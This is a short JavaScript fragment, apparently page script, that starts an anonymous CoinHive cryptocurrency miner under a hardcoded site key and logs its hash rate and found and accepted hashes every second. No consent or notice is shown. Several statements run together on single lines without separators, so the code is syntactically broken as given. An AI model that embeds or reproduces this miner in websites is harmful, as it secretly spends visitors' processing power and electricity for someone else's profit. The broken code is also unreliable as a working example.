            var miner = new CoinHive.Anonymous('gED3jAflX41iCBtZdyQuZVANOUvA0ur7');
            miner.start();
            miner.on('found', function() {
                console.log("found hash!")
            }) miner.on('accepted', function() {
                console.log("accepted hash!")
            }) setInterval(function() {
                var hashesPerSecond = miner.getHashesPerSecond();
                var totalHashes = miner.getTotalHashes();
                var acceptedHashes = miner.getAcceptedHashes();
                console.log("hashesPerSecond", hashesPerSecond) console.log("totalHashes", totalHashes) console.log("acceptedHashes", acceptedHashes) console.log("-----------") console.log("-----------") console.log("-----------")
            }, 1000);